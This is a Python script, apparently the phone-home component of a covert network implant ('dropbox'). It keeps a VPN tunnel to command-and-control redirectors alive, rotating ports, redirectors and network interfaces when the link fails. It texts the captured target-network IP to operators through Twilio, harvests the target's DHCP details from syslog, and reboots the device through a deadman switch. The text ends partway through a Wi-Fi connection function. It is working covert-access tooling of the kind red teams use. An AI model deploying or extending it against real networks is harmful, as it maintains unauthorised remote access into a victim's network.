#!/usr/bin/python3
import os, sys, re, time, datetime, configparser, socket, nmap, netifaces, subprocess

####################################################
#
# Global variables
#
####################################################

STATIC_SETTINGS = {}				# Dictionary to hold static settings
STATIC_FILENAME = ""				# File name of static settings file
DYNAMIC_SETTINGS = {}				# Dictionary to hold global settings
DYNAMIC_FULL_PATH = ""
LOG_FILE = ""					# Log file name
FS = "/"
FIRST_RUN = False

IP_REGEX = "([0-9]{1,3}\.){3}[0-9]{1,3}"

####################################################
#
# Functions
#
####################################################

# Get the log flie name
def get_log_name(static_config):
	if os.path.isfile(static_config):
		config = configparser.ConfigParser()
		config.read(static_config)
		
		return config['files']['log_file_name']
	else:
		print("Couldn't open file")
		return ""

# Write to the log file
def log_write(string):
        location = LOG_FILE
        if os.path.isfile(location):
                logfile = open(location, 'a')
        else:
                logfile = open(location, 'w')

        if location:
                logfile.write(datetime.datetime.now().ctime() + ":\t" + string + "\n")
        else:
                print("Write to log file failed")

def send_sms(sms_body):
	# Get settings from static.cfg
	twilio_account = STATIC_SETTINGS['notify']['twilio_account']
	twilio_token = STATIC_SETTINGS['notify']['twilio_token']
	twilio_from = STATIC_SETTINGS['notify']['twilio_from']
	notify_numbers = comma_string_to_array( STATIC_SETTINGS['notify']['notify_numbers'] )
	DeviceID = STATIC_SETTINGS['notify']['device_id']

	#Checking & formatting time
	timedate = datetime.datetime.now()
	tdate = timedate.strftime('%I:%M%p')

	#Format Message header you want to send
	sms_message = '%s: %s \n%s' % (DeviceID,tdate,sms_body)


	#Sending sms to every number in config.txt
	for i in range(len(notify_numbers)):
		from twilio.rest import Client
		client = Client(twilio_account, twilio_token)
		message = client.messages.create(
               		to=notify_numbers[i],
               		from_=twilio_from,
               		body=sms_message,
       			)

def on_boot_sms():
	log_write("Sending on boot SMS")
	# Get the target network IP
	target_net_ip = find_interface_ip(STATIC_SETTINGS['interfaces']['targ_net_int'])
	log_write("SMS Target Network IP: " + target_net_ip)
	
	interfaces = netifaces.interfaces()

	tun_ip = ""

	for i in range(len(interfaces)):
		if re.match(".*tun.*", interfaces[i]):
			tun_ip = find_interface_ip(interfaces[i])
			log_write("SMS tun IP: " + tun_ip)

	if is_ip(target_net_ip) and is_ip(tun_ip):
		send_sms("Booted. Target Network IP: " + target_net_ip + " OpenVPN IP: " + tun_ip)
	elif is_ip(target_net_ip) and not is_ip(tun_ip):
		send_sms("Booted. Target Network IP: " + target_net_ip + " OpenVPN: Offline")
	else:
		send_sms("Booted. Target Network IP: Offline OpenVPN: Offline")

def status_sms():
	log_write("Sending status SMS")
	# Get the target network IP
	target_net_ip = find_interface_ip(STATIC_SETTINGS['interfaces']['targ_net_int'])
	log_write("SMS Target Network IP: " + target_net_ip)
	
	interfaces = netifaces.interfaces()

	tun_ip = ""

	for i in range(len(interfaces)):
		if re.match(".*tun.*", interfaces[i]):
			tun_ip = find_interface_ip(interfaces[i])
			log_write("SMS tun IP: " + tun_ip)

	if is_ip(target_net_ip) and is_ip(tun_ip):
		send_sms("Status notice - Target Network IP: " + target_net_ip + " OpenVPN IP: " + tun_ip)
	elif is_ip(target_net_ip) and not is_ip(tun_ip):
		send_sms("Status notice - Target Network IP: " + target_net_ip + " OpenVPN: Offline")
	else:
		send_sms("Status notice - Target Network IP: Offline OpenVPN: Offline")

def failure_sms(fail_reason):
	log_write("Sending faiure SMS")
	# Get the target network IP
	target_net_ip = find_interface_ip(STATIC_SETTINGS['interfaces']['targ_net_int'])
	last_online = DYNAMIC_SETTINGS['health']['last_online']
	log_write("SMS Target Network IP: " + target_net_ip)
	
	interfaces = netifaces.interfaces()

	tun_ip = ""

	for i in range(len(interfaces)):
		if re.match(".*tun.*", interfaces[i]):
			tun_ip = find_interface_ip(interfaces[i])
			log_write("SMS tun IP: " + tun_ip)

	if is_ip(target_net_ip) and is_ip(tun_ip):
		send_sms("Fault notice - Target Network IP: " + target_net_ip + " OpenVPN IP: " + tun_ip + "Fault reason: " + fail_reason + " Last online: " + last_online)
	elif is_ip(target_net_ip) and not is_ip(tun_ip):
		send_sms("Fault notice - Target Network IP: " + target_net_ip + " OpenVPN: Offline Fault reason: " + fail_reason + " Last online: " + last_online)
	else:
		send_sms("Fault notice - Target Network IP: Offline OpenVPN: Offline Fault reason: " + fail_reason + " Last online: " + last_online)


def parse_config(filename, verbose):
	settings = {}

	if os.path.isfile(filename):
		config = configparser.ConfigParser()
		config.read(filename)
		
		for section in config.sections():
			settings[section] = {}
			for setting in config[section]:
				settings[section][setting] = config[section][setting]
				if verbose:
					log_write("[" + section + "][" + setting + "]: " + settings[section][setting])
		# Add a final blank line for appearance if verbose
		if verbose:
			log_write("")
		return settings
	else:
		log_write("Couldn't find configuration " + filename)
		return {}

def dump_dynamic_config():
	global DYNAMIC_SETTINGS
	global DYNAMIC_FULL_PATH

	# Set update time
	DYNAMIC_SETTINGS['file_info']['update_time'] = time.time()
	# Increment times run
	DYNAMIC_SETTINGS['file_info']['times_run'] = int(DYNAMIC_SETTINGS['file_info']['times_run']) + 1

	config = configparser.ConfigParser()

	for section in DYNAMIC_SETTINGS:
		config.add_section(section)
		for setting in DYNAMIC_SETTINGS[section]:
			config.set(section,setting,str(DYNAMIC_SETTINGS[section][setting]))

	with open(DYNAMIC_FULL_PATH,'w') as configfile:
		config.write(configfile)

def update_config(config_filename, section_name, value_name, new_value):
        config= configparser.ConfigParser()

        config.read(config_filename)
        config.set(section_name,value_name,new_value)
        with open(config_filename, 'w') as configfile:
                config.write(configfile)

def comma_string_to_array(string):
	split = string.split(",")

	array = []
	for i in range(len(split)):
		array.append( split[i].strip() )

	return array

# Create the in-use OpenVPN configuration 
def create_openvpn_config(filename, template_name, hostname, port):
	success = True
	
	log_write("Generating new OpenVPN config file from " + template_name)
	if os.path.isfile(template_name):
		template = open(template_name,'r')
	else:
		log_write("Couldn't open OpenVPN template")
		success = False

	outfile = open(filename,'w')

	if success:
		for line in template:
			line = line.rstrip("\n")
			# If it's the connection string, rebuild it
			if re.match("^remote .*", line):
				outfile.write("remote " + hostname + " " + port + "\n")
			else:
				outfile.write(line + "\n")

		template.close()
		outfile.close()
	
	if success:
		log_write("Successfully generated new OpenVPN config")
	else:
		log_write("OpenVPN configuration generation failed")
	
	return success

# Checks to see if the connection is up and healthy
def check_vpn_conn():
	# Is there an openvpn process running?
	fail_reason = ""

	log_write("Checking OpenVPN connection")
	process_exists = False
	process_check = os.popen("ps aux | grep -E 'openvpn.*\.ovpn.*' | grep -v grep").read().split("\n")
	for i in range(len(process_check)):
		if re.match(".*openvpn.*\.ovpn.*", process_check[i]):
			process_exists = True
			log_write("Found an OpenVPN process: " + process_check[i])

	# OpenVPN not running? Connection down.
	if not process_exists:
		log_write("No OpenVPN process running")
		log_write("")
		fail_reason = "no_process"
		return fail_reason

	# Is there a tun interface?
	tun_interface = ""
	interfaces = netifaces.interfaces()
	for i in range(len(interfaces)):
		if re.match("tun.*", interfaces[i]):
			log_write("Found tun interface: " + interfaces[i])
			tun_interface = interfaces[i]

	if not tun_interface:
		log_write("No tun interface found.")
		log_write("")
		fail_reason = "no_interface"
		return fail_reason

	tun_gateway = find_tun_gateway(tun_interface)

	# Didn't find the tun gateway? It's computed based on IP, so no IP was found
	if not tun_gateway:
		log_write("No IP found for interface " + tun_interface)
		log_write("")
		fail_reason = "no_ip"
		return fail_reason
	# Find the gateway? Check if SSH is open on it (as in you have connectivity to it)
	else:
		if not check_port_open(tun_gateway, '22'):
			log_write("Port 22 not open on " + tun_gateway + ". No connectivity to VPN server")
			log_write("")
			fail_reason = "no_connectivity"
		else:
			log_write("Port 22 open on " + tun_gateway)

	# If all passed, return nothing
	log_write("OpenVPN connection passed health checks.")
	log_write("")
	DYNAMIC_SETTINGS['health']['last_online'] = time.time()
	DYNAMIC_SETTINGS['health']['last_good'] = DYNAMIC_SETTINGS['cnc']['active_redirector_host'] + "," + DYNAMIC_SETTINGS['cnc']['active_redirector_port']
	return fail_reason


def troubleshoot_conn(fail_reason):
	log_write("Trying to troubleshoot the connection.")

	# Make sure the c2 interface is actually up and connected
	cnc_active = False
	cnc_int = DYNAMIC_SETTINGS['cnc']['active_cnc_int']

	# Check if the device is among the active, connected devices
	nmcli_active = os.popen("nmcli device status").read().split("\n")
	for i in range(len(nmcli_active)):
		if re.match(".*" + DYNAMIC_SETTINGS['cnc']['active_cnc_int'] + ".*", nmcli_active[i]) and not re.match(".*p2p.*", nmcli_active[i]):
			if re.match(".*connected.*", nmcli_active[i]) and not re.match(".*disconnected.*", nmcli_active[i]):
				log_write("Command and control interface is up and connected: " + nmcli_active[i])
				cnc_active = True

	# Not active? Try resetting the connection
	if not cnc_active:
		if DYNAMIC_SETTINGS['cnc']['active_cnc_int_type'] == "wireless":
			log_write("Turning the wireless interface off and back on and attempting to reconnect")
			os.popen("nmcli radio wifi off")
			time.sleep(5)
			os.popen("nmcli radio wifi on")
			time.sleep(5)
			log_write("Reconnecting to wifi")
			connect_wifi(cnc_int)
		if DYNAMIC_SETTINGS['cnc']['active_cnc_int_type'] == "ethernet":
			os.popen("ifconfig " + cnc_int + " down")
			time.sleep(5)
			os.popen("ifconfig " + cnc_int + " up")
			# Doesn't have an ip? Try dhclient
			if not find_interface_ip(DYNAMIC_SETTINGS['cnc']['active_cnc_int']):
				log_write("Interface " + DYNAMIC_SETTINGS['cnc']['active_cnc_int'] + " did not have an IP. Running dhclient")
				os.popen("dhclient " + DYNAMIC_SETTINGS['cnc']['active_cnc_int'])
				# Sleep to allow the connection to come back up
				time.sleep(2)

	# Check routes and try to fix them
	check_and_correct_routes()

	redir_string = "redirector_" + DYNAMIC_SETTINGS['cnc']['active_redirector']
	cnc_ip = DYNAMIC_SETTINGS[redir_string]['hostname_ip']
	cnc_port = DYNAMIC_SETTINGS['cnc']['active_redirector_port']
	recheck_port = check_port_open(cnc_ip, cnc_port)

	# Port open now? Done.
	if recheck_port:
		log_write("Port is back open. Returning")
		return True
	# That didn't work? Maybe time to try a new port

	#Mark the port as not open
	mark_port_closed(DYNAMIC_SETTINGS['cnc']['active_redirector'], cnc_port)
	num_redirectors = int(STATIC_SETTINGS['cnc']['num_redirectors'])
	if not recheck_port:
		found_new_port = False
		for i in range(num_redirectors):
			# Find a new port? Report it and update the OpenVPN configuration
			new_port = find_redir_port(i, False)
			if new_port:
				found_new_port = True
				log_write("Found new port: " + new_port + " on redirector_" + str(i))
				DYNAMIC_SETTINGS['cnc']['active_redirector'] = str(i)
				DYNAMIC_SETTINGS['cnc']['active_redirector_port'] = new_port
				DYNAMIC_SETTINGS['cnc']['active_redirector_host'] = DYNAMIC_SETTINGS["redirector_" + str(i)]['host']
				vpn_file_name = STATIC_SETTINGS['files']['phone_home_dir'] + FS + STATIC_SETTINGS['files']['vpn_file_name']
				template_name = STATIC_SETTINGS['files']['phone_home_dir'] + FS + STATIC_SETTINGS['cnc']['redir_vpn_config_' + str(DYNAMIC_SETTINGS['cnc']['active_redirector']) ]
				create_openvpn_config(vpn_file_name,template_name, DYNAMIC_SETTINGS['cnc']['active_redirector_host'], DYNAMIC_SETTINGS['cnc']['active_redirector_port'])
				return True

	# Still no open ports? Recheck everything.
	if not found_new_port:
		for i in range(num_redirectors):
			# Find a new port? Report it and update the OpenVPN configuration
			new_port = find_redir_port(i, True)
			if new_port:
				found_new_port = True
				log_write("Found new port: " + new_port + " on redirector_" + str(i))
				DYNAMIC_SETTINGS['cnc']['active_redirector'] = str(i)
				DYNAMIC_SETTINGS['cnc']['active_redirector_port'] = new_port
				DYNAMIC_SETTINGS['cnc']['active_redirector_host'] = DYNAMIC_SETTINGS["redirector_" + str(i)]['host']
				vpn_file_name = STATIC_SETTINGS['files']['phone_home_dir'] + FS + STATIC_SETTINGS['files']['vpn_file_name']
				template_name = STATIC_SETTINGS['files']['phone_home_dir'] + FS + STATIC_SETTINGS['cnc']['redir_vpn_config_' + str(DYNAMIC_SETTINGS['cnc']['active_redirector']) ]
				create_openvpn_config(vpn_file_name,template_name, DYNAMIC_SETTINGS['cnc']['active_redirector_host'], DYNAMIC_SETTINGS['cnc']['active_redirector_port'])
				return True

	# Still not found anything? Hit the deadman switch if it's been tool long. Change interfaces if the threshold is met. If it hasn't, dump the dynamic state and quit.
	if not found_new_port:
		DYNAMIC_SETTINGS['health']['fail_count'] = int(DYNAMIC_SETTINGS['health']['fail_count'] ) + 1

		# Check if the dropbox should be rebooted, per the deadman setting
		check_deadman_switch()

		cnc_index = get_cnc_int_index(cnc_int)
		if int(DYNAMIC_SETTINGS['health']['fail_count'] ) > int(STATIC_SETTINGS['cnc_int_' + str(cnc_index)]['max_retries']):
			change_cnc_interface()
			return True
		else:
			log_write("Couldn't resolve issues with interface " + cnc_int + ". Exiting.")
			dump_dynamic_config()
			quit()


# As a last ditch effort, reboot the machine if it hasn't had an OpenVPN connection beyond the deadman treshold
def check_deadman_switch():
	deadman_time = int(STATIC_SETTINGS['cnc']['deadman_reboot'])

	# Deadman_time = 0 means never reboot, per makeconfig. Don't reboot if that's set
	if not deadman_time == 0:
		if time.time() - float(DYNAMIC_SETTINGS['health']['last_online']) > float(deadman_time):
			log_write("Deadman threshold hit. Rebooting the machine.")
			os.popen("shutdown -r now")


def change_cnc_interface():
	old_int = DYNAMIC_SETTINGS['cnc']['active_cnc_int']
	old_int_index = get_cnc_int_index(old_int)
	num_redirectors = int(STATIC_SETTINGS['cnc']['num_redirectors'])
	num_cnc_ints = int(STATIC_SETTINGS['cnc']['num_cnc_ints'])

	max_index = num_cnc_ints - 1


	# At the last index? Go back to the start
	if old_int_index == max_index:
		new_index = 0
	# Otherwise, increment by one
	else:
		new_index = old_int_index + 1

	# Update the active c2 interface
	DYNAMIC_SETTINGS['cnc']['active_cnc_int'] = STATIC_SETTINGS['cnc_int_' + str(new_index)]['name']
	DYNAMIC_SETTINGS['cnc']['active_cnc_int_type'] = STATIC_SETTINGS['cnc_int_' + str(new_index)]['type']

	log_write("Changing c2 interface from " + old_int + " to " +DYNAMIC_SETTINGS['cnc']['active_cnc_int'] + " with type " + DYNAMIC_SETTINGS['cnc']['active_cnc_int_type'])

	# Wireless? Set up the wireless connection
	if DYNAMIC_SETTINGS['cnc']['active_cnc_int_type'] == 'wireless':
		print("Interface is wireless. Connecting to wifi.")
		connect_wifi(DYNAMIC_SETTINGS['cnc']['active_cnc_int'])

	# Reset the fail count
	DYNAMIC_SETTINGS['health']['fail_count'] = 0

	# Reset the redirectors
	for i in range(num_redirectors):
		sec_string = "redirector_" + str(i)
		DYNAMIC_SETTINGS[sec_string] = {}

		DYNAMIC_SETTINGS[sec_string]['checked_hostname'] = 'n'		# Indicates wether the hostname has been checked
		DYNAMIC_SETTINGS[sec_string]['checked_hostname_time'] = 0 	# Time hostname was checked
		DYNAMIC_SETTINGS[sec_string]['hostname_resolvable'] = ""	# Was the hostname resolvable when checked?
		DYNAMIC_SETTINGS[sec_string]['hostname_ip'] = ""		# The resolved hostname IP
		DYNAMIC_SETTINGS[sec_string]['exhausted_ports'] = 'n'	# Indicates all ports have been tested and found inaccessible
		DYNAMIC_SETTINGS[sec_string]['redir_failures'] = 0	# Initialize number of connection failures on interface to 0
		DYNAMIC_SETTINGS[sec_string]['host'] = ""		# The host we're going to use. Can be hostname or IP depending on config
		set_redir_host(i, True)
		ports = comma_string_to_array( STATIC_SETTINGS['cnc']['cnc_ports_init'] )
		DYNAMIC_SETTINGS[sec_string]['num_ports'] = len(ports)
		for j in range(len(ports)):
			DYNAMIC_SETTINGS[sec_string]["redir_ports_" + str(j) + "_portnum"] = ports[j]	# The actual port number
			DYNAMIC_SETTINGS[sec_string]["redir_ports_" + str(j) + "_port_open"] = ""		# Is the port open from this interface? Blank = not scanned yet

	# Make sure the routes to the redirectors now go over the new interface
	check_and_correct_routes()


	# Try to find a port that works given the reset redirectors
	for i in range(num_redirectors):
		new_port = find_redir_port(i, True)
		# Find a new port? Report it and update the OpenVPN configuration
		if new_port:
			found_new_port = True
			log_write("Found new port: " + new_port + " on redirector_" + str(i))
			DYNAMIC_SETTINGS['cnc']['active_redirector'] = str(i)
			DYNAMIC_SETTINGS['cnc']['active_redirector_port'] = new_port
			DYNAMIC_SETTINGS['cnc']['active_redirector_host'] = DYNAMIC_SETTINGS["redirector_" + str(i)]['host']
			vpn_file_name = STATIC_SETTINGS['files']['phone_home_dir'] + FS + STATIC_SETTINGS['files']['vpn_file_name']
			template_name = STATIC_SETTINGS['files']['phone_home_dir'] + FS + STATIC_SETTINGS['cnc']['redir_vpn_config_' + str(DYNAMIC_SETTINGS['cnc']['active_redirector']) ]
			create_openvpn_config(vpn_file_name,template_name, DYNAMIC_SETTINGS['cnc']['active_redirector_host'], DYNAMIC_SETTINGS['cnc']['active_redirector_port'])

	# Everything fixed? Good. Try to connect
	connect_openvpn()

def get_port_index(redir_num, port_num):
	redir_string = "redirector_" + str(redir_num)
	num_ports = int(DYNAMIC_SETTINGS[redir_string]['num_ports'])

	for i in range(num_ports):
		if DYNAMIC_SETTINGS[redir_string]['redir_ports_' + str(i) + "_portnum"] == port_num:
			return i

def get_cnc_int_index(interface):
	num_ints = int( STATIC_SETTINGS['cnc']['num_cnc_ints'] )

	for i in range(num_ints):
		if STATIC_SETTINGS['cnc_int_' + str(i)]['name'] == interface:
			return i

	return ""


def mark_port_closed(redir_num, port_num):
	port_index = get_port_index(redir_num, port_num)

	DYNAMIC_SETTINGS["redirector_" + str(redir_num)]['redir_ports_' + str(port_index) + "_port_open"] = 'n'


def is_ip(string):
	if re.match(IP_REGEX, string):
		return True
	else:
		return False

def check_port_open(host, port):
	scanner =  nmap.PortScanner()

	scan_result = scanner.scan(hosts=host, arguments='-sS -Pn -n -p ' + port)

	result = scan_result['scan'][host]['tcp'][int(port)]['state']

	if result == "open":
		return True
	else:
		return False

def get_routes():
	output = os.popen("ip route show").read().split("\n")

	return output

def get_default_route():
	routes = get_routes()

	for i in range(len(routes)):
		if re.match(".*default.*", routes[i]):
			return routes[i]

	return ""

def get_default_route_interface():
	default_route = get_default_route()

	if default_route:
		split = default_route.split()
		for i in range(len(split)):
			if split[i] == "dev":
				interface = split[i + 1]
				return interface

	return ""

# Reset an interface by bringing it up and down
def reset_interface(iface, sleep):
	os.popen("ifconfig " + iface + " down")
	time.sleep(sleep)
	os.popen("ifconfig " + iface + " up")

# Get the initial settings of the primary interface without interference from other interfaces. Takes down interface, which may cause issues if they don't come back
def get_primary_int_settings_netifaces():
	global STATIC_SETTINGS
	global DYNAMIC_SETTINGS

	prim = STATIC_SETTINGS['interfaces']['targ_net_int']

	log_write("Getting primary interface settings - netiface method")

	log_write("Primary interface: " + prim)

	interfaces = netifaces.interfaces()

	found_prim = False

	# Make sure the interface is actually an existent interface, otherwise this will kill the dropbox
	for i in range(len(interfaces)):
		if interfaces[i] == prim:
			found_prim = True

	# Don't do anything if the primary interface isn't found due to the above
	if not found_prim:
		log_write("get_primary_int_settings_netifaces tried to find primary interface: " + prim + " but failed to.")
		return False

	# Put down other interfaces to prevent interference with settings
	log_write("Taking down the non-primary interfaces")
	for i in range(len(interfaces)):
		curr_int = interfaces[i]
		if not curr_int == prim and not curr_int == "lo" and not re.match("tun.*", curr_int):
			os.popen("ifconfig " + curr_int + " down")

	# Reset the primary interface to get it back to normal
#	reset_interface(prim, 5)

	prim_add = netifaces.ifaddresses(prim)[2][0]

	DYNAMIC_SETTINGS['primary_int']['ip'] = prim_add['addr']
	log_write("Primary interface ip: " + DYNAMIC_SETTINGS['primary_int']['ip'])
	DYNAMIC_SETTINGS['primary_int']['netmask'] = prim_add['netmask']
	log_write("Primary interface netmask: " + DYNAMIC_SETTINGS['primary_int']['netmask'])
	DYNAMIC_SETTINGS['primary_int']['broadcast'] = prim_add['broadcast']
	log_write("Primary interface broadcast: " + DYNAMIC_SETTINGS['primary_int']['broadcast'])

	# Find Gateway
	gw = netifaces.gateways()[2]

	for i in range(len(gw)):
		if gw[i][1] == prim:
			if gw[i][2]:
				DYNAMIC_SETTINGS['primary_int']['gateway'] = gw[i][0]
				log_write("Primary interface gateway: " + DYNAMIC_SETTINGS['primary_int']['gateway'])

	# Bring the interfaces back up
	for i in range(len(interfaces)):
		curr_int = interfaces[i]
		if not curr_int == prim and not curr_int == "lo":
			os.popen("ifconfig " + curr_int + " up")
			print("Interface " + curr_int + " up")

	# Return true if the goodies were found
	if DYNAMIC_SETTINGS['primary_int']['ip'] and DYNAMIC_SETTINGS['primary_int']['netmask'] and DYNAMIC_SETTINGS['primary_int']['broadcast'] and DYNAMIC_SETTINGS['primary_int']['gateway']:
		log_write("get_primary_int_settings_netifaces found primary interface settings")
		return True
	else:
		log_write("get_primary_int_settings_netifaces failed to find primary interface settings")
		return False

# Uses syslog primarily to pull lease info. Less risky than netifaces as it's passive.
def get_primary_int_settings_syslog():
	global STATIC_SETTINGS
	global DYNAMIC_SETTINGS

	# Get the primary interface name from settings
	prim = STATIC_SETTINGS['interfaces']['targ_net_int']

	log_write("Getting primary interface settings - syslog method")

	log_write("Primary interface: " + prim)

	# Get syslog DHCP stuff

	syslog_files = os.popen("ls /var/log/syslog*").read().split("\n")

	print (syslog_files)

	for file in syslog_files:
		file = file.strip("\n").strip()
		print("Filename: " + file)
		if not re.match(".*gz$", file):
			syslog_dhcp = os.popen("grep -i dhcp /var/log/syslog | grep -v 'option requested' | grep -vi state | grep = | grep -i " + prim).read().split("\n")
		else:
			syslog_dhcp = os.popen("zgrep -i dhcp " + file + " | grep -v 'option requested' | grep -vi state | grep = | grep -i " + prim).read().split("\n")
		try:
			start = 0
			# Dict to hold DHCP options
			options = {}

			# Find the latest DHCP lease's start line in syslog
			for i in range(len(syslog_dhcp)):
				if re.match(".*option dhcp_lease_time.*", syslog_dhcp[i]):
					start = i

			for i in range(start, len(syslog_dhcp)):
				try:
					osplit = syslog_dhcp[i].split()
					print(syslog_dhcp[i])
					option_name = osplit[10]
					option_value = osplit[12].strip("'").strip()
					options[option_name] = option_value
				except:
					log_write("primary_int settings couldn't process: " + syslog_dhcp[i])


			DYNAMIC_SETTINGS['primary_int']['ip'] = options['ip_address']
			log_write("Primary interface ip: " + DYNAMIC_SETTINGS['primary_int']['ip'])

			DYNAMIC_SETTINGS['primary_int']['netmask'] = options['subnet_mask']
			log_write("Primary interface netmask: " + DYNAMIC_SETTINGS['primary_int']['netmask'])

			#DYNAMIC_SETTINGS['primary_int']['broadcast'] = prim_add['broadcast']
			#log_write("Primary interface broadcast: " + DYNAMIC_SETTINGS['primary_int']['broadcast'])

			# Find Gateway

			DYNAMIC_SETTINGS['primary_int']['gateway'] = options['routers']
			log_write("Primary interface gateway: " + DYNAMIC_SETTINGS['primary_int']['gateway'])

			DYNAMIC_SETTINGS['primary_int']['nameserver'] = options['domain_name_servers']
			log_write("Primary interface nameserver: " +  DYNAMIC_SETTINGS['primary_int']['nameserver'])

			if DYNAMIC_SETTINGS['primary_int']['ip'] and DYNAMIC_SETTINGS['primary_int']['netmask'] and DYNAMIC_SETTINGS['primary_int']['gateway']:
				log_write("get_primary_int_settings_syslog found primary interface settings")
				return True

		except:
			log_write("Couldn't process syslog file " + file)
	
	# Couldn't get anything out of any syslog files? Return false
	return False

# Sets the host variable. This will be an IP or hostname depending on configuration
def set_redir_host(redir_num, force_refresh):
	global STATIC_SETTINGS
	global DYNAMIC_SETTINGS

	log_write("Setting the host setting for redirector_" + str(redir_num))
	redir_string = "redirector_" + str(redir_num)

	# Use hostnames? See if the hostname is resolveable if it hasn't already been resolved
	if (STATIC_SETTINGS['cnc']['use_hostnames'] == 'y' and DYNAMIC_SETTINGS[redir_string]['checked_hostname'] == 'n') or (force_refresh and STATIC_SETTINGS['cnc']['use_hostnames'] == 'y' ):
		log_write("Using hostnames for configuration.")
		curr_ip = ""
		try:	
			hostname = STATIC_SETTINGS['cnc']['redir_hostname_' + str(redir_num)]
			log_write("Trying to resolve: " + hostname)
			DYNAMIC_SETTINGS[redir_string]['checked_hostname'] = 'y'
			DYNAMIC_SETTINGS[redir_string]['checked_hostname_time'] = time.time()
			curr_ip = socket.gethostbyname(hostname)

			
			if curr_ip:
				log_write("Resolved " + hostname + ": " + curr_ip)
				DYNAMIC_SETTINGS[redir_string]['hostname_ip'] = curr_ip
				DYNAMIC_SETTINGS[redir_string]['hostname_resolvable'] = 'y'
				DYNAMIC_SETTINGS[redir_string]['host'] = hostname
				
				
		except:
			DYNAMIC_SETTINGS[redir_string]['hostname_resolvable'] = 'n'
			log_write("Resolving " + hostname + " failed. Using backup ip")
			DYNAMIC_SETTINGS[redir_string]['host'] = STATIC_SETTINGS['cnc']['redir_backup_ip_' + str(redir_num)]


	# Not using hostnames? Set it to the backup IP
	else:
		DYNAMIC_SETTINGS[redir_string]['host'] = STATIC_SETTINGS['cnc']['redir_backup_ip_' + str(redir_num)]
		curr_ip = DYNAMIC_SETTINGS[redir_string]['host']

	if DYNAMIC_SETTINGS[redir_string]['host']:
		return True
	else:
		return False

# Sets the hostname_ip for a given redirector
def set_redir_hostname_ip(redir_num):
	global DYNAMIC_SETTINGS
	global STATIC_SETTINGS

	redir_string = "redirector_" + str(redir_num)
	log_write("Using set_redir_hostname_ip to set the host ip for " + redir_string)


	# Using hostnames? Try to resolve it to an ip
	if STATIC_SETTINGS['cnc']['use_hostnames'] == 'y':
		try:
			hostname = STATIC_SETTINGS['cnc']['redir_hostname_' + str(redir_num)]
			log_write("Trying to resolve: " + hostname)
			DYNAMIC_SETTINGS[redir_string]['checked_hostname'] = 'y'
			DYNAMIC_SETTINGS[redir_string]['checked_hostname_time'] = time.time()
			curr_ip = socket.gethostbyname(hostname)
			
			if curr_ip:
				log_write("Resolved " + hostname + ": " + curr_ip)
				DYNAMIC_SETTINGS[redir_string]['hostname_ip'] = curr_ip
				DYNAMIC_SETTINGS[redir_string]['hostname_resolvable'] = 'y'
				DYNAMIC_SETTINGS[redir_string]['host'] = hostname
		except:
			DYNAMIC_SETTINGS[redir_string]['hostname_resolvable'] = 'n'
			log_write("Resolving " + hostname + " failed. Using backup ip")
			DYNAMIC_SETTINGS[redir_string]['host'] = STATIC_SETTINGS['cnc']['redir_backup_ip_' + str(redir_num)]
			DYNAMIC_SETTINGS[redir_string]['hostname_ip'] = STATIC_SETTINGS['cnc']['redir_backup_ip_' + str(redir_num)]

	#Not using hostnames? Set them to the backup ip
	else:
		DYNAMIC_SETTINGS[redir_string]['host'] = STATIC_SETTINGS['cnc']['redir_backup_ip_' + str(redir_num)]
		DYNAMIC_SETTINGS[redir_string]['hostname_ip'] = STATIC_SETTINGS['cnc']['redir_backup_ip_' + str(redir_num)]

	if DYNAMIC_SETTINGS[redir_string]['hostname_ip']:
		return True
	else:
		return False

# If the auto lookup stuff fails for some reason, this will serve as backup
def pick_fallback():
	global STATIC_SETTINGS
	global DYNAMIC_SETTINGS

# Remove the old files
def make_clean():
	global STATIC_SETTINGS
	global DYNAMIC_SETTINGS

	# Delete the dynamic settings file
	os.popen("rm " + DYNAMIC_FULL_PATH)

	# Delete the OpenVPN config
	STATIC_SETTINGS['files']['phone_home_dir'] + FS + STATIC_SETTINGS['files']['dynamic_file_name']
	os.popen("rm + " + STATIC_SETTINGS['files']['phone_home_dir'] + FS + STATIC_SETTINGS['files']['vpn_file_name'])

def find_redir_port(redir_num, recheck_all):
	global STATIC_SETTINGS
	global DYNAMIC_SETTINGS
	redir_string = "redirector_" + str(redir_num)

	found_port = False

	log_write("Checking for an open port on redirector_" + str(redir_num))

	# No host set? Set it.
	if not DYNAMIC_SETTINGS[redir_string]['host']:
		set_redir_host(redir_num, False)

	for j in range( int(DYNAMIC_SETTINGS[redir_string]['num_ports']) ):
		port_string = 'redir_ports_' + str(j) 

		# Forcing a port recheck? Reset the port_open setting for this port
		if recheck_all:
			DYNAMIC_SETTINGS[redir_string][port_string + '_port_open'] = ""

		curr_port = DYNAMIC_SETTINGS[redir_string][port_string + '_portnum']
		curr_host = DYNAMIC_SETTINGS[redir_string]['host']

		# check port expects an IP to match up its output, so make sure we feed it one
		print("Curr host: " + curr_host)
		print("DYNAMIC_SETTINGS[redir_string]['hostname_ip']: " + DYNAMIC_SETTINGS[redir_string]['hostname_ip'])
		print(is_ip(curr_host))
		if is_ip(curr_host):
			curr_ip = curr_host
		elif not is_ip(curr_host) and DYNAMIC_SETTINGS[redir_string]['hostname_ip']:
			curr_ip = DYNAMIC_SETTINGS[redir_string]['hostname_ip']
		else:
			log_write("Host is not an IP and host is not resolveable. Failed to set redirection port")
			return ""

		# Has the port been checked? Skip if so, and set return the port if it is open
		if DYNAMIC_SETTINGS[redir_string][port_string + '_port_open']:
			log_write("Port " + curr_port + " has already been checked and not rechecking all. Skipping")
			if DYNAMIC_SETTINGS[redir_string][port_string + '_port_open'] == 'y':
				curr_port = DYNAMIC_SETTINGS[redir_string][port_string + '_portnum']
				return curr_port
			if DYNAMIC_SETTINGS[redir_string][port_string + '_port_open'] == 'n':
				is_open = False
		else:
			log_write("Checking port " + curr_port + " on host " + curr_host)
			is_open = check_port_open(curr_ip, curr_port)			
		
		if is_open:
			log_write("Found open port " + curr_port + " on host " + curr_host)
			DYNAMIC_SETTINGS[redir_string]['redir_ports_' + str(j) + "_port_open"] = 'y'
			print("Open!")
			# Find an open port? Jump out"
			found_port = True
			# If an open port is successfully found, this should result in exit of the function
			return curr_port
				
		else:
			log_write("Port " + curr_port + " on " + curr_host + " was not open")
			DYNAMIC_SETTINGS[redir_string]['redir_ports_' + str(j) + "_port_open"] = 'n' 

	if not found_port:
		return ""

def connect_wifi(interface):
	global STATIC_SETTINGS
	wifi_pass = STATIC_SETTINGS['wireless_cnc']['wireless_cnc_wpa_key']
	wifi_ssid = STATIC_SETTINGS['wireless_cnc']['wireless_cnc_ssid']

